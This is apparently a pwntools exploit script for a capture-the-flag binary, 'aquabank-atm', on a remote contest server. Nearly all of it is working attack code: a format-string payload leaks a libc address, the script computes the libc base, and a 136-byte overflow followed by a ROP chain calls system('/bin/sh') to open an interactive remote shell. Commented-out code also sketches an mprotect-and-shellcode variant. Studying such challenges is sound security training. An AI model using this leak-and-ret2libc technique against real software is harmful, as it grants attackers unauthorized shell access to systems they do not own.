from pwn import *

# NX is enabled the rest is disdabled.

context.binary = elf = ELF('./aquabank-atm', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
#context.arch = 'amd64'

#p = process('./aquabank-atm')
p = remote('offsec.m0lecon.it', 13577)

#idea: leak the libc address, and then overwrite the return address with system("/bin/sh")
# we have a puts we can use to leak the libc address, and we have a buffer overflow to overwrite the return address.
# then, the malicious payload will be passed to the withdraw function.

# leaking is possible but not as seen previously, because the buffer is a global variable and it belongs to .bss

# aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab

OFFSET_TO_RIP = 136 # found with gdb, injecting the cyclic pattern as the last argument of the withdraw function, 
                    #and then looking at the value of the instruction pointer when the program crashes.

# looking with gdb, i've seen that both libc_start_call_main and libc_start_main are present on the stack. the first at offset 0x07,
# the second one at offset 0x1b

# payload to use to retrieve the libc_start_main + 135 is %33$p because 27 is the offset on the stack + 6 of register arguments
libc_start_main = libc.symbols['__libc_start_main']

#print(libc_start_main)

# first, send %33$p to set_note to begin the format string attack

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'note: ', b'%33$p') 

# then, obtain the address using the print_note function
p.sendlineafter(b'> ', b'2')
p.recvuntil(b'--- Your customer note ---\n')
# Parse the leak
leaked_hex = p.recvline().strip()
leaked_addr = int(leaked_hex, 16)
log.info(f"Leaked __libc_start_main+offset: {leaked_addr:#x}")

# calculate the libc base address. we need 139 and not 135 as in the local system because of the different libc version used 
# on the remote server, which has a different offset for __libc_start_main. 
# i've found such value using objdump -d on the remote libc and looking for the offset of __libc_start_main, 
# which is 0x21ab0, and then adding the 6 bytes of the register arguments to reach the return address.

libc.address = leaked_addr - libc_start_main - 139
log.success(f"Calculated Libc Base: {libc.address:#x}") 
# gadgets to use 
rop_libc = ROP(libc)
ret = rop_libc.find_gadget(['ret']).address
pop_rdi = rop_libc.find_gadget(['pop rdi', 'ret']).address
pop_rsi = rop_libc.find_gadget(['pop rsi', 'ret']).address
binsh = next(libc.search(b'/bin/sh\x00'))
# put /bin/sh inside the note
#shellcode = asm(shellcraft.sh())

'''
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'note: ', shellcode)
note_addr = elf.symbols['note']
page_start = note_addr & 0xfffffffffffff000 
mprotect_addr = libc.symbols['mprotect']

rop_libc.mprotect(page_start, 0x1000, 7)
'''
# preparing the payload to overwrite the return address with system("/bin/sh")


payload = flat(
    b'A' * OFFSET_TO_RIP, # padding to reach the return address
    ret, # stack alignment
    pop_rdi, # pop rdi; ret
    binsh, # address of "/bin/sh"
    libc.symbols['system'] # address of system
)


'''
payload = flat(
    b'A' * OFFSET_TO_RIP,
    ret,
    rop_libc.chain(),
    note_addr # jump to the shellcode
)
'''

p.sendlineafter(b'> ', b'3')
p.sendlineafter(b'account: ', b'aaaa') # account number, not relevant for the exploit
p.sendlineafter(b'Amount: ', b'100') # amount, not relevant for the exploit
p.sendlineafter(b'(be brief):', payload)

p.interactive()